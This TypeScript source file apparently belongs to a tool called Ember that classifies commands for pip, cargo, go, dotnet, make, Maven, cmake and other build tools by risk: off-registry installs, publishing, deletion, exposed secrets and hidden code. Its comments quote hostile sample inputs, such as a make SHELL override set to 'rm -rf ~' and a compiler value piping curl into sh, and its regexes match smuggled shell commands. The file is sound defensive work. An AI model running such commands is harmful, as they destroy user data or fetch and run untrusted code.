    const p = heldOpts(h, { shortValue: "rcetbifC", longValue: ["requirement", "constraint", "editable", "target", "build", "index-url", "extra-index-url", "find-links", "platform", "python-version", "implementation", "abi", "root", "prefix", "src", "upgrade-strategy", "config-settings", "global-option", "install-option", "progress-bar", "report", "only-binary", "no-binary", "trusted-host", "proxy", "retries", "timeout", "exists-action", "cert", "client-cert", "cache-dir", "log", "python", "keyring-provider", "use-feature", "use-deprecated", "group"] }, { shortValue: "rcetbi", longValue: ["requirement", "constraint", "editable", "target", "build", "index-url", "extra-index-url", "find-links", "platform", "python-version", "implementation", "abi", "root", "prefix", "src", "upgrade-strategy", "config-settings", "global-option", "install-option", "progress-bar", "report", "only-binary", "no-binary"] }, rest);
    for (const r of values(p, "r", "requirement", "c", "constraint")) if (r) h.e.usePath(lit(r), "read", h.sc);
    // Its log, its cache and the certificates it reads (commands-remote-v5-3).
    optionFiles(h, rest, p, { write: ["log"], into: ["cache-dir"], read: ["cert", "client-cert"] });
    // The folders it installs into (review #169).
    for (const d of values(p, "t", "target", "root", "prefix", "src")) if (d) writeInto(h, d);
    const editable = values(p, "e", "editable").map(v => (v === null ? { v: null, raw: "?", glob: false } : lit(v)));
    const reqs = values(p, "r", "requirement").map(r => ({ kind: "path" as const, text: r ?? "?", abs: null }));
    const objects = [...packageObjects(h, [...p.operands, ...editable]), ...reqs];
    if (values(p, "index-url", "extra-index-url", "i", "find-links").length) h.e.add("escape", "pkg.off-registry", "Installs a package from a URL, a git repository or a file; its setup code runs.");
    h.e.add("system", "pkg.language", verb === "uninstall" ? PKG_REMOVES : "Installs packages (they can run their own setup code).", { objects, widening: has(p, "user") ? [] : [], program: `pip ${verb}` });
    return;
  }
  if (verb === "config" && rest.some(a => a.v === "--global")) h.e.add("system", "pip.config.global", "Changes settings for every user.");
  if (verb === "download" || verb === "wheel") {
    // The folder it saves into (review #169), and what it downloads there: a wheel it unpacks or a script it finds is
    // the download, so running one later asks (commands-remote-r8-2).
    const p = parseOpts(rest, { shortValue: "rcdwi", longValue: ["requirement", "constraint", "dest", "wheel-dir", "index-url", "extra-index-url", "find-links", "platform", "python-version", "implementation", "abi", "src"] });
    const dests = values(p, "d", "dest", "w", "wheel-dir");
    for (const d of dests) if (d) writeInto(h, d);
    for (const d of dests) { if (d) h.e.markUnnamed(d, h.sc); else h.e.markUnnamed(null, h.sc); }
    if (dests.length === 0) h.e.markUnnamed(".", h.sc);
    h.e.readArgs(rest.filter(a => !isOption(a) && !URL_LIKE.test(a.v ?? "")), h.sc);
  }
}
reg(NATIVE, ["pip", "pip3", "pip2"], h => pip(h));

reg(NATIVE, ["pipx", "poetry", "pipenv", "uv", "rye", "pdm", "hatch", "conda", "mamba", "micromamba", "gem", "bundle", "bundler", "composer", "nuget", "luarocks", "opam", "stack", "cabal", "rustup", "sdk", "asdf", "nvm", "pyenv", "rbenv", "volta", "fnm", "vcpkg", "conan", "dart", "flutter", "mix", "deno"], h => {
  const first = firstOperand(h.args);
  const verb = first.v;
  const rest = h.args.slice(first.at + 1);
  const specs = rest.filter(a => !isOption(a));
  if (first.at < h.args.length && verb === null) { h.e.unclear("unclear.package-verb", "Ember can't tell which command this runs."); return; }
  if (verb === null) {
    if (h.key === "bundle" || h.key === "bundler") languageInstall(h, []);
    if (h.key === "deno" || h.key === "conda") return;
    return;
  }
  // Running something in the project's environment: the command after it is classified.
  if ((verb === "run" && /^(poetry|pipenv|uv|rye|pdm|hatch|conda|mamba|micromamba)$/.test(h.key)) || (verb === "exec" && /^(bundle|bundler|composer|pdm)$/.test(h.key))) {
    const spec: OptSpec = {
      shortValue: "npfC", stopAtOperand: true,
      longValue: ["name", "prefix", "with", "python", "directory", "project", "env", "group", "extra", "package", "with-editable", "with-requirements", "env-file", "index", "default-index", "index-url", "extra-index-url", "find-links", "config-setting", "cwd", "python-preference", "exclude-newer", "resolution", "prerelease", "link-mode", "refresh-package", "upgrade-package", "reinstall-package", "no-group", "only-group", "cache-dir", "config-file", "color"],
    };
    // Main's table knew ten value options and no -f or -C, so the word after any other (`uv run --cache-dir x cmd`) was
    // the program it ran: judged that way too (commands-held-8).
    const was: OptSpec = { shortValue: "np", longValue: ["name", "prefix", "with", "python", "directory", "project", "env", "group", "extra", "package"], stopAtOperand: true };
    const p = heldOpts(h, spec, was, rest);
    if (h.key === "uv" && values(p, "with").length) h.e.add("escape", "escape.npx", SAYS.downloadsProgram);
    // The folder it runs the command in, its cache and the files it reads (commands-remote-v5-3).
    optionFiles(h, rest, p, { cd: ["directory", "cwd", "C"], into: ["cache-dir"], read: ["with-requirements", "config-file", "env-file"] });
    h.e.payload(p.operands, h.sc, `${h.key} ${verb}`);
    return;
  }
  if ((h.key === "pipx" && verb === "run") || (h.key === "uv" && verb === "tool" && specs[0]?.v === "run") || (h.key === "deno" && verb === "run" && specs.some(a => URL_LIKE.test(a.v ?? "") || /^(npm|jsr):/i.test(a.v ?? ""))) || (h.key === "rye" && verb === "tools" && specs[0]?.v === "run")) {
    h.e.add("escape", "escape.npx", SAYS.downloadsProgram);
    // The package's own command line is judged too (modes-y9-5): after `pipx run`, `uv tool run`, `deno run`.
    packageLine(h, h.key === "pipx" || h.key === "deno" ? rest : rest.slice(rest.indexOf(specs[0]) + 1), `${h.key} ${verb}`);
    return;
  }
  if ((h.key === "deno") && verb === "eval") { h.e.unclear("unclear.inline-code", "It runs code given on the command line."); return; }
  if (h.key === "deno" && (verb === "run" || verb === "test" || verb === "task")) { if (verb === "task") nameCheck(h, specs[0]?.v ?? ""); else if (specs[0]) runScript(h, specs[0]); return; }
  if ((h.key === "poetry" || h.key === "pipenv") && verb === "shell") { h.e.unclear("unclear.interactive", SAYS.interactive); return; }
  if (/^(poetry|flit|hatch|pdm|uv|rye)$/.test(h.key) && verb === "publish") { h.e.add("publish", `${h.key}.publish`, "Publishes a package to the registry.", { program: `${h.key} publish`, objects: [{ kind: "package", text: "", abs: null }] }); return; }
  if (h.key === "gem" && verb === "push") { h.e.add("publish", "gem.push", `Publishes ${specs[0]?.v ?? "a gem"} to the registry.`, { program: "gem push", objects: [{ kind: "package", text: specs[0]?.v ?? "", abs: null }] }); return; }
  if (h.key === "gem" && verb === "yank") { h.e.add("remote-delete", "npm.unpublish", "Removes a gem from the registry."); return; }
  if (h.key === "nuget" && verb === "push") { h.e.add("publish", "nuget.push", "Publishes a package to the registry."); return; }
  if (h.key === "nuget" && verb === "delete") { h.e.add("remote-delete", "npm.unpublish", "Removes a package from the registry."); return; }
  if (h.key === "conan" && verb === "upload") { h.e.add("publish", "conan.upload", "Publishes a package to the registry."); return; }
  if (h.key === "mix" && /^hex\.(publish|owner|retire)/.test(verb)) { h.e.add("publish", "mix.publish", "Publishes a package to the registry."); return; }
  if (h.key === "composer" && verb === "run-script") { nameCheck(h, specs[0]?.v ?? ""); return; }
  // `composer config <key> <value>` writes a setting later commands obey (commands-remote-r9-11); `--list` and one
  // key alone only read.
  // Its stored sign-ins, printed or set (commands-classes-y9-7).
  if (h.key === "composer" && verb === "config" && specs.some(a => /^(github-oauth|gitlab-oauth|gitlab-token|bitbucket-oauth|http-basic|bearer)(\.|$)/i.test(a.v ?? ""))) h.e.add("secret", "secret.program", SAYS.secrets);
  if (h.key === "composer" && verb === "config" && (specs.length >= 2 || rest.some(a => a.v === "--unset")) && !rest.some(a => a.v === "-l" || a.v === "--list")) {
    h.e.add("system", "pkg.config", "Changes a setting later commands obey, such as where packages come from.", { program: "composer config" });
    return;
  }
  if (h.key === "dart" && verb === "pub" && specs[0]?.v === "publish") { h.e.add("publish", "dart.publish", "Publishes a package to the registry."); return; }
  if (h.key === "conda" && verb === "env" && /^(create|remove|update)$/.test(specs[0]?.v ?? "")) { languageInstall(h, []); return; }
  const verbs = LANGUAGE_INSTALL_VERBS[h.key] ?? [];
  if (verbs.includes("*") || verbs.includes(verb)) {
    if (h.key === "uv" && verb === "pip" && !/^(install|uninstall|sync)$/.test(specs[0]?.v ?? "")) return;
    if ((h.key === "uv" || h.key === "rye") && /^(tool|tools|python|toolchain)$/.test(verb) && !/^(install|uninstall|upgrade|update|fetch)$/.test(specs[0]?.v ?? "")) return;
    if (h.key === "dart" || h.key === "flutter") { if (!/^(get|upgrade|add|remove|downgrade|global)$/.test(specs[0]?.v ?? verb)) return; }
    const pkgs = specs.filter(a => !/^(install|uninstall|add|remove|pip|tool|tools|python|toolchain)$/.test(a.v ?? ""));
    languageInstall(h, pkgs);
  }
});
reg(NATIVE, ["twine", "flit", "vsce", "ovsx"], h => {
  const verb = firstOperand(h.args).v ?? "";
  if (/^(upload|publish|register)$/.test(verb)) {
    h.e.add("publish", h.key === "twine" ? "twine.upload" : `${h.key}.publish`, "Publishes a package to the registry.", { program: `${h.key} ${verb}`, objects: [{ kind: "package", text: "", abs: null }] });
    h.e.readArgs(h.args.filter(a => !isOption(a)).slice(1), h.sc);
  } else if (verb === "unpublish") h.e.add("remote-delete", "npm.unpublish", "Removes a package from the registry.");
  else if (verb === "login") h.e.add("secret", "secret.npm", SAYS.secrets);
});
reg(NATIVE, ["cargo"], h => {
  const g = globals(h, "cargo");
  checkGlobals(h, "cargo", g);
  if (g.opts.some(o => o.name === "--config" || o.name === "-Z")) h.e.unclear("unclear.cargo-config", "Runs code from a setting.");
  if (h.args[0]?.v?.startsWith("+")) { /* a toolchain: fine */ }
  const at = h.args[g.verbAt]?.v?.startsWith("+") ? g.verbAt + 1 : g.verbAt;
  const verb = h.args[at]?.v ?? null;
  const rest = h.args.slice(at + 1);
  const specs = rest.filter(a => !isOption(a));
  if (verb === null) return;
  if ((LANGUAGE_INSTALL_VERBS.cargo).includes(verb)) {
    if (verb === "install" && rest.some(a => /^--(git|path|index|registry)$/.test(a.v ?? ""))) h.e.add("escape", "pkg.off-registry", "Installs a package from a URL, a git repository or a file; its setup code runs.");
    languageInstall(h, specs);
    return;
  }
  if (verb === "publish") { h.e.add("publish", "cargo.publish", "Publishes a crate to the registry.", { program: "cargo publish", objects: [{ kind: "package", text: "", abs: null }] }); return; }
  if (verb === "yank" || verb === "owner") { h.e.add("remote-delete", "npm.unpublish", "Changes a crate on the registry."); return; }
  if (verb === "login" || verb === "logout") { h.e.add("secret", "secret.npm", SAYS.secrets); return; }
  if (verb === "xtask") { nameCheck(h, specs[0]?.v ?? ""); return; }
  if (verb === "clean") { h.e.add("destroy", "script.destroy", "Runs clean, whose name says it deletes things."); return; }
});
reg(NATIVE, ["go"], h => {
  const verb = firstOperand(h.args).v;
  const rest = h.args.slice(firstOperand(h.args).at + 1);
  // `go test -exec`, `go build -toolexec` and `-vettool` name a program go runs over the build: a value that looks like
  // a command asks, as `GOFLAGS=-toolexec=…` does (commands-remote-c8-1).
  // Written with two dashes too, and with its value attached out of Ember's sight (`-toolexec="$T"`), which is a program
  // Ember can't see, as the value written apart is (commands-remote-x8-4).
  for (let k = 0; k < rest.length; k++) {
    const word = rest[k].v ?? rest[k].raw.replace(/["']/g, "");
    const m = GO_PROGRAM_ARG.exec(word);
    if (!m) continue;
    const prog = rest[k].v === null ? null : m[1] !== undefined ? m[1] : rest[k + 1]?.v ?? null;
    if (programUnvouched(prog)) h.e.unclear("unclear.assignment", "It runs a program Ember can't vouch for.");
  }
  if (verb === "install" || verb === "get") { languageInstall(h, rest.filter(a => !isOption(a))); return; }
  if (verb === "run" && rest.some(a => /@/.test(a.v ?? "") && !isOption(a))) { h.e.add("escape", "escape.npx", SAYS.downloadsProgram); return; }
  if (verb === "run") { const s = rest.find(a => !isOption(a)); if (s) runScript(h, s); return; }
  if (verb === "clean" && rest.some(a => /^-(cache|modcache|testcache|fuzzcache)$/.test(a.v ?? ""))) h.e.add("destroy", "script.destroy", "Runs clean, whose name says it deletes things.");
  // build and test -c write the program where -o says, a file or a folder (review #169).
  if (verb === "build" || verb === "test") {
    // Building a downloaded source writes the program it names (`-o app`) as a download too, so `./app` later asks
    // (commands-remote-r8-2). A downloaded .go or go.mod in the build's folder, or a source given outright.
    const fromDownload = (h.sc.cwd !== null && h.e.downloadedProjectFile(h.sc.cwd, h.sc, TOOL_PROJECT_FILES.go))
      || rest.some(a => !isOption(a) && a.v !== null && /\.go$/i.test(a.v) && h.e.isDownloaded(a, h.sc));
    for (let k = 0; k < rest.length; k++) {
      const m = /^--?o(=([\s\S]*))?$/.exec(rest[k].v ?? "");
      if (!m) continue;
      const o = m[1] !== undefined ? m[2] : rest[k + 1]?.v;
      if (o === null || o === undefined) h.e.add("destroy", "redirect.overwrite", "Writes to a file Ember can't name.");
      else if (!NULL_SINKS.has(o.toLowerCase())) { h.e.usePath(lit(o), "write", h.sc); if (fromDownload) h.e.carryDownload(o, h.sc); }
    }
  }
});
reg(NATIVE, ["dotnet"], h => {
  const g = globals(h, "dotnet");
  checkGlobals(h, "dotnet", g);
  const verb = h.args[g.verbAt]?.v ?? null;
  const rest = h.args.slice(g.verbAt + 1);
  const sub = rest.find(a => !isOption(a))?.v ?? null;
  if (verb === "nuget" && sub === "push") { h.e.add("publish", "nuget.push", "Publishes a package to the registry.", { program: "dotnet nuget push" }); return; }
  if (verb === "nuget" && sub === "delete") { h.e.add("remote-delete", "npm.unpublish", "Removes a package from the registry."); return; }
  if ((verb === "add" && sub === "package") || (verb === "tool" && /^(install|update|uninstall|restore)$/.test(sub ?? "")) || (verb === "workload" && /^(install|update|uninstall|repair|restore)$/.test(sub ?? "")) || verb === "restore") {
    languageInstall(h, rest.filter(a => !isOption(a)).slice(verb === "restore" ? 0 : 1));
    return;
  }
  if (verb === "remove" && sub === "package") { languageInstall(h, rest.filter(a => !isOption(a)).slice(1)); return; }
  if (verb === "clean") { h.e.add("destroy", "script.destroy", "Runs dotnet clean, which deletes build output.", { program: "dotnet clean" }); return; }
  // `dotnet ef database drop`, `dotnet ef migrations remove`: judged by their words like a task runner's target.
  if (verb === "ef") { nameCheck(h, rest.filter(a => !isOption(a)).slice(0, 2).map(a => a.v ?? "").join(" "), `dotnet ef ${rest.filter(a => !isOption(a)).slice(0, 2).map(a => a.v ?? "?").join(" ")}`); return; }
  // A publish profile (or DeployOnBuild) deploys what it builds; plain `dotnet publish` writes a local folder.
  if ((verb === "publish" || verb === "build" || verb === "msbuild") && rest.some(a => /^[-/]p(roperty)?:(PublishProfile|DeployOnBuild|WebPublishMethod|PublishUrl)=/i.test(a.v ?? ""))) {
    h.e.add("publish", "script.publish", "Builds and deploys with a publish profile.", { program: `dotnet ${verb}` });
    return;
  }
  if (verb === "run" || verb === "test" || verb === "build" || verb === "publish") return;
  if (verb && /\.(dll|exe)$/i.test(verb)) runScript(h, h.args[g.verbAt]);
});
/** MSBuild: its targets are judged by name (§3.5.9); a publish profile or DeployOnBuild deploys. */
reg(NATIVE, ["msbuild"], h => {
  for (const a of h.args) {
    const v = a.v ?? "";
    const t = /^[-/]t(arget)?:(.+)$/i.exec(v);
    if (t) for (const name of t[2].split(/[;,]/)) nameCheck(h, name);
    if (/^[-/]p(roperty)?:(PublishProfile|DeployOnBuild|WebPublishMethod|PublishUrl)=/i.test(v)) h.e.add("publish", "script.publish", "Builds and deploys with a publish profile.", { program: "msbuild" });
  }
});
/** Maven's options of two or more letters, as the long options they stand for (`-pl core` is one option, not -p -l). */
const MVN_WORDS: Readonly<Record<string, string>> = {
  "-pl": "--projects", "-rf": "--resume-from", "-gs": "--global-settings", "-gt": "--global-toolchains", "-emp": "--encrypt-master-password",
  "-ep": "--encrypt-password", "-am": "--also-make", "-amd": "--also-make-dependents", "-cpu": "--check-plugin-updates", "-fae": "--fail-at-end",
  "-ff": "--fail-fast", "-fn": "--fail-never", "-npr": "--no-plugin-registry", "-npu": "--no-plugin-updates", "-nsu": "--no-snapshot-updates",
  "-ntp": "--no-transfer-progress", "-up": "--update-plugins", "-llr": "--legacy-local-repository", "-itr": "--ignore-transitive-repositories",
};
/** Task runners and package scripts (§3.5.9): their targets' names say what they do. */
reg(NATIVE, ["make", "gmake", "mingw32-make", "nmake", "just", "rake", "invoke", "inv", "ant", "sbt", "lein", "gradle", "gradlew", "mvn", "mvnw", "nox", "tox", "task", "mage", "ninja"], h => {
  // make's -j and -l take the next word only when it is a number (`make -j install` builds install); Maven's -X, nox's -r and
  // tox's -v, -r and -n take no value, and Maven's options of two or more letters are whole words (commands-remote-i5a).
  const valueShort: Record<string, string> = { make: "CfIoWE", gmake: "CfIoWE", "mingw32-make": "CfIoWE", nmake: "fX", just: "fd", rake: "fIrRCeEp", gradle: "pbcgIxDP", gradlew: "pbcgIxDP", mvn: "bDflPsTt", mvnw: "bDflPsTt", nox: "sfeptk", tox: "ecxfm", task: "dt", ant: "fDl", ninja: "Cfjkldtw" };
  const mvn = h.key === "mvn" || h.key === "mvnw";
  const gnuMake = /^(g|mingw32-)?make$/.test(h.key);
  const args = mvn ? h.args.map(a => (a.v !== null && MVN_WORDS[a.v] ? { ...a, v: MVN_WORDS[a.v] } : a)) : h.args;
  // Main's table gave Maven's -X, -p, -g and -r, nox's -r and tox's -v, -r and -n the next word and knew no --define,
  // --activate-profiles, --builder, --log-file and the like, so the word after one was a target, read Maven's words of
  // two letters as written (`-gs` as -g with s) and gave --jobs and --load-average any next word: judged that way too; a
  // job count is the one thing read as now, --threads' too (commands-held-8). What stands apart after a count option
  // and is no count is read as main read it: GNU make's -j and -l took the word whatever it was (`make -j -- -f FILE`
  // named the makefile), and --threads, --max-workers and nmake's -j and -l took none, so a variable or a switch after
  // one was a target or an option of its own (commands-held-10).
  const p = heldOpts(h, {
    shortValue: valueShort[h.key] ?? "", shortNumeric: /make$/.test(h.key) ? "jl" : "", longNumeric: ["jobs", "load-average", ...(/^gradlew?$/.test(h.key) ? ["max-workers"] : [])],
    longValue: ["file", "makefile", "directory", "include-dir", "old-file", "what-if", "justfile", "working-directory", "set", "project-dir", "build-file", "settings-file", "gradle-user-home", "init-script", "exclude-task", "projects", "resume-from", "settings", "global-settings", "session", "sessions", "keywords", "environment", "envlist", "taskfile", "dir", "global-toolchains", "toolchains", "encrypt-master-password", "encrypt-password", "builder", "log-file", "activate-profiles", "threads", "define"],
  }, { shortValue: mvn ? "fsplDPTtbgrX" : h.key === "nox" ? "sfeptkr" : h.key === "tox" ? "ecvrnx" : valueShort[h.key] ?? "", shortNumeric: /make$/.test(h.key) ? "jl" : "", numericAny: gnuMake ? ["j", "l"] : [], numericCountOnly: ["threads", "max-workers", ...(gnuMake ? [] : ["j", "l"])], longNumeric: ["jobs", "load-average", "threads", ...(/^gradlew?$/.test(h.key) ? ["max-workers"] : [])], longValue: ["file", "makefile", "directory", "include-dir", "old-file", "what-if", "justfile", "working-directory", "set", "project-dir", "build-file", "settings-file", "gradle-user-home", "init-script", "exclude-task", "projects", "resume-from", "settings", "global-settings", "session", "sessions", "keywords", "environment", "envlist", "taskfile", "dir", "jobs", "load-average"] }, args, h.args);
  // A makefile read from stdin, /dev/stdin or a process substitution is a build program Ember can't vouch for: its
  // recipes run shell (review #166). Ember asks unless it can see the whole text and it is plainly ordinary.
  if ((/make$/.test(h.key) || h.key === "ninja") && values(p, "f", "file", "makefile").some(f => f === null || STDIN_NAME.test(f))) {
    fromStdin(h, () => h.e.unclear("unclear.stdin-code", "Runs code Ember can't see."));
    return;
  }
  // One given as another descriptor (`-f /dev/fd/3 3<<< …`) can't be read first either.
  if ((/make$/.test(h.key) || h.key === "ninja") && values(p, "f", "file", "makefile").some(f => f !== null && STREAM_NAME.test(f))) {
    h.e.unclear("unclear.script-stream", SAYS.scriptStream);
    return;
  }
  for (const f of values(p, "f", "file", "makefile", "justfile", "build-file", "b", "settings-file", "c", "init-script", "I")) if (f && !STDIN_NAME.test(f)) h.e.usePath(lit(f), "read", h.sc);
  // `ninja -t <tool>` runs one of ninja's own tools, not a target (review #167).
  if (h.key === "ninja" && values(p, "t").length) { ninjaTool(h, values(p, "t")[0]); return; }
  // make takes the word after -j or -l only when it is a count or a variable, so a value the text gives a variable there
  // that isn't one is a target or a variable, as written there (`T=deploy; make -j "$T"`), and an option-like one asks
  // (commands-remote-w5-2). Unquoted, the shell splits that value into words, each after the count an argument of its
  // own, for any task runner's job count apart (`T='4 deploy'; make -j $T`, `./gradlew --max-workers $T`:
  // commands-remote-x6-1), Maven's and ninja's included (commands-y6-2).
  const counts: Arg[] = [];
  for (const o of p.opts) {
    // Maven's -T and ninja's -j and -l take the word after them whatever it is.
    const anyCount = (mvn && /^(-T|--threads)$/.test(o.name)) || (h.key === "ninja" && /^-[jl]$/.test(o.name));
    if (!anyCount && !(/make$/.test(h.key) && /^-[jl]$/.test(o.name)) && !/^--(jobs|load-average|max-workers)$/.test(o.name)) continue;
    // Attached, only a count is the option's value (attachedCount): any other word Ember can't see is an operand, a
    // target and for make a variable override Ember can't name, as on main (commands-a7-1).
    if (o.parts !== undefined) continue;
    const word: Arg | undefined = o.value === null ? args[o.at + 1] : undefined;
    if (!word) {
      if (o.name === "--threads" && typeof o.value === "string" && !/^\d+$/.test(o.value)) counts.push(lit(o.value));
      continue;
    }
    // Only a number, a processor count's substitution or arithmetic of numbers is surely the count (countWord). Any
    // other word, a variable whatever the command set it to, is judged as on main: after Gradle's --max-workers or
    // Maven's --threads, which took no value there, a target or a goal; after make's -j and -l, Maven's -T and ninja's
    // -j and -l, which took the next word there, the count, with what the text set the variable to built as targets
    // (commands-a7-1).
    if (countWord(word.raw)) continue;
    if (/^--(max-workers|threads)$/.test(o.name)) counts.push({ v: null, raw: word.raw, glob: false });
    const quoted = /"$/.test(word.raw);
    // A variable the text set to words Ember can't see (`X=$(cat jobs.txt); make -j $X`) may be a count and targets, as
    // that substitution written there is: a target Ember can't name, unless quoted for a count that takes any word
    // (commands-z6-4).
    if (!(quoted && anyCount) && h.e.mayHoldWords(word)) counts.push({ v: null, raw: word.raw, glob: false });
    for (const f of h.e.knownForms(word, true)) {
      if (f === null) continue;
      // A part Ember can't see is one word of it (`T="$(nproc) deploy"`): commands-y6-2.
      for (const [k, w] of (quoted ? [f] : f.split(/[ \t\n]+/).filter(x => x !== "")).entries()) {
        // For an option that takes any word, the first word is the count whatever it is; otherwise only a number or one
        // Ember can't see is.
        if (k === 0 && (anyCount || /^\d+(\.\d+)?$/.test(w) || w.includes(UNSEEN))) continue;
        if (w.includes(UNSEEN)) counts.push({ v: null, raw: word.raw, glob: false });
        else if (w.startsWith("-")) h.e.unclear("unclear.unresolved-arg", `Ember can't tell which arguments ${h.prog} gets.`);
        else counts.push(lit(w));
      }
    }
  }
  // make: `--eval` and variable overrides that name a shell or hold command text run code Ember can't see in the
  // makefile's recipes (`make SHELL='rm -rf ~' build`, `make CC='sh -c …'`).
  if (/make$/.test(h.key)) {
    if (has(p, "eval") || values(p, "E").length || h.args.some(a => /^--eval/.test(a.v ?? ""))) h.e.unclear("unclear.make-eval", "It adds make rules Ember can't see.");
    for (const a of [...p.operands, ...counts]) {
      const m = a.v === null ? null : /^([A-Za-z_.][A-Za-z0-9_.]*)\s*[:+?!]?=(.*)$/s.exec(a.v);
      if (a.v !== null && !m) continue;
      if (a.v === null || /^(\.?SHELL|\.SHELLFLAGS|MAKESHELL|MAKEFLAGS|MFLAGS|GNUMAKEFLAGS|MAKEFILES|\.RECIPEPREFIX)$/.test(m![1]) || /[$`;|&<>()\n"']/.test(m![2]) || /^\s*(sh|bash|zsh|dash|ksh|fish|python\d*(\.\d+)?|perl|ruby|node|env|eval|exec|busybox|xargs)(\s|$)/.test(m![2])) {
        h.e.unclear("unclear.make-variable", "It sets a make variable to text that could run as a command.");
      }
    }
  }
  if (h.key === "rake" && (values(p, "e", "p", "E").length || has(p, "execute", "execute-print", "execute-continue"))) h.e.unclear("unclear.inline-code", "It runs code given on the command line.");
  // Maven's exec plugin runs the program its exec.* properties name on the command line (`mvn exec:exec
  // -Dexec.executable=sh`), and Gradle runs the init scripts `--init-script` gives it: code Ember can't read first
  // (commands-closed-x9-6). The pom's own exec configuration is the project's, as its targets are.
  if (mvn && h.args.some(a => a.v !== null && /^(-D)?exec\.(executable|args|mainClass|commandlineArgs|classpathScope)\b/.test(a.v))) {
    h.e.unclear("unclear.hidden-command", `Ember can't tell what ${h.prog} runs.`);
  }
  if (/^gradlew?$/.test(h.key) && values(p, "init-script", "I").length) h.e.unclear("unclear.hidden-command", "It runs a Gradle init script Ember can't read first.");
  let targets = [...p.operands, ...counts].filter(a => a.v === null || !/^[A-Za-z_][A-Za-z0-9_.]*=/.test(a.v));
  if (h.key === "nox") targets = values(p, "s", "session", "sessions").map(v => lit(v ?? "?"));
  if (h.key === "tox") targets = values(p, "e", "environment", "envlist").map(v => lit(v ?? "?"));
  if (h.key === "mvn" || h.key === "mvnw") targets = targets.filter(t => !(t.v ?? "").startsWith("-"));
  for (const t of targets) {
    if (t.v === null) { h.e.unclear("unclear.target", "It runs a target Ember can't name."); continue; }
    nameCheck(h, t.v, `${h.prog} ${t.v}`);
    if (t.v === "deploy" && (h.key === "mvn" || h.key === "mvnw")) h.e.add("publish", "mvn.deploy", "Publishes a package to the registry.");
  }
  for (const a of h.args) if (a.v !== null && /^-?-?D?[A-Za-z0-9_.]*=/.test(a.v) && commandLineSecret(a.v)) h.e.add("secret", "secret.token-arg", SAYS.tokenArg);
});

/** ninja's tools (review #167): clean and cleandead delete build output, browse opens a browser on a web server, msvc runs the command after `--`. */
function ninjaTool(h: H, tool: string | null): void {
  if (tool === null) { h.e.unclear("unclear.ninja-tool", "Ember can't tell which ninja tool this runs."); return; }
  if (tool === "clean" || tool === "cleandead") { h.e.add("destroy", "script.destroy", `Runs ninja -t ${tool}, which deletes build output.`); return; }
  if (tool === "browse") { h.e.add("escape", "escape.launcher", SAYS.opensProgram); return; }
  if (tool === "msvc") { const dd = h.args.findIndex(a => a.v === "--"); h.e.payload(dd >= 0 ? h.args.slice(dd + 1) : [], h.sc, "ninja -t msvc"); }
}
reg(NATIVE, ["bazel", "bazelisk"], h => {
  // `bazel clean` deletes build output; `bazel run <target>` runs a target, judged by its name like a make target, and
  // its other arguments are read as any program's are; `--script_path` writes a script that runs it (review #167).
  const verb = firstOperand(h.args);
  if (verb.v === "clean") { h.e.add("destroy", "script.destroy", "Runs bazel clean, which deletes build output."); return; }
  if (verb.v === "run") {
    const target = h.args.slice(verb.at + 1).find(a => !isOption(a));
    if (target?.v === null) h.e.unclear("unclear.target", "It runs a target Ember can't name.");
    else if (target) nameCheck(h, target.v, `${h.prog} run ${target.v}`);
    for (let k = 0; k < h.args.length && h.args[k].v !== "--"; k++) {
      const v = h.args[k].v;
      if (v === "--script_path" && h.args[k + 1]) h.e.usePath(h.args[k + 1], "write", h.sc);
      else if (v?.startsWith("--script_path=")) h.e.usePath(lit(v.slice("--script_path=".length)), "write", h.sc);
    }
  }
  generic(h);
});

// cmake (review #167): `cmake -E <command>` is a portable shell. Its rm, copy, rename, tar, touch and link commands are
// judged like rm, cp, mv, tar, touch and ln; time, env and chdir run the command after them. `cmake -P <script>` runs a
// CMake script (its execute_process runs programs), judged like an interpreter's script.
reg(NATIVE, ["cmake"], h => {
  const e = h.args.findIndex(a => a.v === "-E");
  if (e >= 0) { cmakeCommand(h, h.args[e + 1], h.args.slice(e + 2)); return; }
  // `-D NAME[:TYPE]=VALUE` written apart: VALUE is read as an argument is (`-DNAME=VALUE` already is).
  h.e.readArgs(h.args.flatMap((a, k) => (h.args[k - 1]?.v === "-D" && a.v?.includes("=") ? [lit(a.v.slice(a.v.indexOf("=") + 1))] : [])), h.sc);
  // A `-DCMAKE_<lang>_COMPILER` or `_COMPILER_LAUNCHER` override names the program cmake builds with: a value that looks
  // like a command (`sh -c "curl|sh"`) asks, as the same thing set as `CC=…` does (commands-remote-c8-1). An ordinary
  // compiler name (`clang`) runs.
  for (let k = 0; k < h.args.length; k++) {
    const a = h.args[k];
    const dash = a.v === "-D" ? (h.args[k + 1]?.v ?? "") : /^-D(.+)$/.exec(a.v ?? "")?.[1] ?? "";
    const m = /^CMAKE_[A-Z0-9_]*(COMPILER|COMPILER_LAUNCHER|RC_COMPILER|LINKER)(:[A-Za-z]+)?=(.*)$/s.exec(dash);
    if (m && namesProgram("CC", m[3])) h.e.unclear("unclear.assignment", "It changes how commands are found or run.");
  }
  const p = h.args.findIndex(a => a.v === "-P");
  if (p >= 0) {
    const script = h.args[p + 1];
    // The script's arguments and the -D values are read as any program's are.
    h.e.readArgs(h.args.filter((_, k) => k !== p && k !== p + 1), h.sc, { unresolvedUnclear: true });
    if (!script) { h.e.unclear("unclear.script", "It runs a script Ember can't name."); return; }
    if (script.v !== null && STDIN_NAME.test(script.v)) { intoInterpreter(h); return; }
    if (script.v !== null && STREAM_NAME.test(script.v)) { h.e.unclear("unclear.script-stream", SAYS.scriptStream); return; }
    runScript(h, script);
    return;
  }
  const b = h.args.findIndex(a => a.v === "--build");
  if (b >= 0) cmakeBuild(h, h.args.slice(b + 1));
  generic(h);
});
/**
 * `cmake --build DIR`'s targets (after --target or -t, one or more, and the build tool's own after `--`) are judged by
 * their names, as make's are; --clean-first runs the clean target first (review #167).
 */
function cmakeBuild(h: H, args: Arg[]): void {
  let targets = false;
  for (let k = 0; k < args.length; k++) {
    const v = args[k].v;
    if (v === null) continue;
    if (v === "--") { for (const t of args.slice(k + 1)) if (t.v !== null && !t.v.startsWith("-")) nameCheck(h, t.v, `${h.prog} --build -- ${t.v}`); return; }
    if (v === "--clean-first") h.e.add("destroy", "script.destroy", `Runs ${h.prog} --build --clean-first, which deletes build output.`);
    if (v.startsWith("--target=")) nameCheck(h, v.slice("--target=".length), `${h.prog} --build --target ${v.slice("--target=".length)}`);
    if (v.startsWith("-")) { targets = v === "--target" || v === "-t"; continue; }
    if (targets) nameCheck(h, v, `${h.prog} --build --target ${v}`);
  }
}
/** One `cmake -E` command, judged as the program it stands for. */
